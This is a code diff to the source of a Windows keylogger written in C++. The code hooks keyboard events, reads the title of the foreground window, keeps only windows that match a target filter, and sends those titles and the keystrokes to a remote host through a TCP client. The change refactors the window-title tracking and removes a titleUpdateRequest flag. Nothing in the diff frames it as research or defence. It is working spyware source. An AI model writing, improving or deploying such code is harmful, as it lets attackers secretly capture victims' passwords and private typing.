@@ -22,7 +22,6 @@ TcpClient* Keylogger::client;
 BYTE Keylogger::states[256] = {0};
 
 HWND Keylogger::hLastTrackedWindow = NULL;
-bool Keylogger::titleUpdateRequest = false;;
 bool Keylogger::isWorthy = false;
 std::wstring Keylogger::lastTrackedWindowTitle;
 
@@ -77,25 +76,22 @@ __declspec(dllexport) LRESULT CALLBACK Keylogger::KeyboardEventHandler(int nCode
 			HWND hWindow = GetForegroundWindow();
 			HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));
 
-			if (hWindow != hLastTrackedWindow || titleUpdateRequest) {
-				wchar_t windowTitleBuf[255];
-				GetWindowTextW(hWindow, windowTitleBuf, 255);
-				std::wstring title(windowTitleBuf);
-				if (title != lastTrackedWindowTitle) {
-					if (filter->Check(title)) {
-						isWorthy = true;
-						hLastTrackedWindow = hWindow;
-						lastTrackedWindowTitle = title;
-						std::wstring message = L"\n[" + title + L"]\n\t";
-						client->Send(message);
-					}
-					else
-						isWorthy = false;
+			wchar_t windowTitleBuf[255];
+			GetWindowTextW(hWindow, windowTitleBuf, 255);
+			std::wstring title(windowTitleBuf);
+			if (title != lastTrackedWindowTitle) {
+				if (filter->Check(title)) {
+					isWorthy = true;
+					hLastTrackedWindow = hWindow;
+					lastTrackedWindowTitle = title;
+					std::wstring message = L"\n[" + title + L"]\n\t";
+					client->Send(message);
 				}
 				else
-					isWorthy = true;
-				titleUpdateRequest = false;		
+					isWorthy = false;
 			}
+			else if (title != L"")
+				isWorthy = true;
 
 			switch (keyGroup) //key group
 			{
@@ -103,7 +99,6 @@ __declspec(dllexport) LRESULT CALLBACK Keylogger::KeyboardEventHandler(int nCode
 
 				if (isWorthy)
 					client->Send(specialKeysNames[keyPos]);
-				titleUpdateRequest = true;
 				break;
 			case 1: //valueKeys
 			case 2:
